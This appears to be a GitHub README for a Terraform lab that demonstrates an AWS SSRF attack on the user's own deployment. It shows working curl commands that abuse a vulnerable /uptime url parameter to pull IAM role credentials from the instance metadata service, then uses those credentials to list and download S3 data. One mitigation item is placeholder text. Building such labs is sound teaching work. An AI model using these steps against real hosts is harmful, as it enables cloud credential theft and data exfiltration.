# SSRF vulnerablity demo
![AWS](https://img.shields.io/badge/AWS-%23FF9900.svg?style=for-the-badge&logo=amazon-aws&logoColor=white)![Terraform](https://img.shields.io/badge/terraform-%235835CC.svg?style=for-the-badge&logo=terraform&logoColor=white)

## Demo diagram 
![Diagram]()

## Purpose
Demonstrating a Server Side Request Forgery (SSRF) attack in AWS environment , similar to the [CapitalOne breach](https://www.capitalone.com/digital/facts2019/).
The environment will be deployed with Terraform IaC module.



## Prerequisites
* Active AWS account.
* AWS IAM user with AWS credential type: ["Access key - Programmatic access"](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html) and [AdministratorAccess](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-vs-inline.html)

*  [Terraform installed](https://learn.hashicorp.com/tutorials/terraform/install-cli)
* Clone this repo to the environmnet which you run terraform from : 
```ShellSession
git clone https://github.com/ramibo/ssrf_aws_demo.git 
```

* Optional - In the following files ,set the paramters with your values :  
main.tf : `availability_zone` , `resource "aws_key_pair"{public_key}`  
providers.tf : `shared_config_files`,`shared_credentials_files`, `profile` , `region`



## Running the demo

1. `cd` to the  `ssrf_aws_demo` directory.

2. Run `terraform init` command to prepare your working directory for next commands.

3. Run `terraform validate` command check whether the configuration is valid.

4. Run `terraform plan` command show changes required by the current configuration.

5. Run `terraform apply` / `terraform apply -auto-approve` to create / update the infrastructure at AWS.

6. If there no errors from the prvious steps , from your terminal run the following :
__Important 1__ - The `host` can be the created ec2 instance [Public IPv4 address / DNS ](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html#concepts-public-addresses). 
__Important 2__ - In the next steps `bash$` prompt with `"command"` is for commands  you need to run.
```ShellSession
bash$ curl -s http://host:5000 
AWS SSRF IMDSv1 demo
```

7. The `/uptime` page is vulnerable to an SSRF attack: 
We will utilize the url parameter with the instance metadata URI --> retrieve the attached iam role --> extract the security credentials as following : 
```ShellSession
bash$ curl -s http://host:5000/uptime?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
aws_ssrf_demo_iam_role
bash$ curl -s http://host:5000/uptime?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/aws_ssrf_demo_iam_role
{
  "Code" : "Success",
  "LastUpdated" : "2022-12-20T20:56:29Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIASF",
  "SecretAccessKey" : "Id+zUu",
  "Token" : "IQoJb3JpZ2luX2VjEEUaCXVzLW",
  "Expiration" : "2022-12-21T03:31:14Z"
}
```

8. From the attached role security credentials output you got in your environment,  copy the values of : 
`AccessKeyId` 
`SecretAccessKey` 
`Token`

9. With aws cli - configure a new `aws_ssrf_demo_profile_s3` profile:
```ShellSession
aws configure --profile aws_ssrf_demo_profile_s3
```

10. Set the following parmteres in your `"$HOME/.aws/credentials"` file with the value copied at step 8:
For example ,
```ShellSession
[aws_ssrf_demo_profile_s3]
aws_access_key_id = ASIASF
aws_secret_access_key = Id+zUu
aws_session_token=IQoJb3JpZ2luX2VjEEUaCXVzLW
```

11. Get the data from s3  :
```ShellSession
# Get the list of s3 buckets
bash$ aws s3 ls --profile aws_ssrf_demo_profile_s3 
2022-12-20 22:55:47 aws-ssrf-demo-s3-bucket

# Get the bucket content
bash$ aws s3 ls aws-ssrf-demo-s3-bucket --profile aws_ssrf_demo_profile_s3 
2022-12-20 22:55:48        403 aws_ssrf_demo_data_file.json

# Create a directory
bash$ mkdir data_from_s3
bash$ cd data_from_s3/
bash$ ls -l
total 0

# Retrive the json file from the bucket
bash$ aws s3 cp s3://aws-ssrf-demo-s3-bucket/aws_ssrf_demo_data_file.json /$HOME/data_from_s3/ --profile aws_ssrf_demo_profile_s3 
download: s3://aws-ssrf-demo-s3-bucket/aws_ssrf_demo_data_file.json to ./aws_ssrf_demo_data_file.json

bash$ ls -l
total 8
-rw-r--r--  1 user  group  403 Dec 20 22:55 aws_ssrf_demo_data_file.json


!!! The SSRF attack was sucessfull !!!
```

12. Run `terraform destroy` / `terraform destroy -auto-approve` to remove the infrastructure created at AWS.
## Mitigation Steps

1. Enabling IMDS version 2 of the service

2. Fix the application by sanitize/validate all client-supplied input data.

3. dfgsd

## Refrences
* [FreeCodeCamp - Learn Terraform (and AWS) by Building a Dev Environment – Full Course for Beginners](https://www.youtube.com/watch?v=iRaai1IBlB0)
* [An SSRF, privileged AWS keys and the Capital One breach](https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-the-capital-one-breach-4c3c2cded3af)
* [How to hack AWS instances that have the metadata service (IMDSv1) enabled](https://alexanderhose.com/how-to-hack-aws-instances-with-the-metadata-service-enabled/)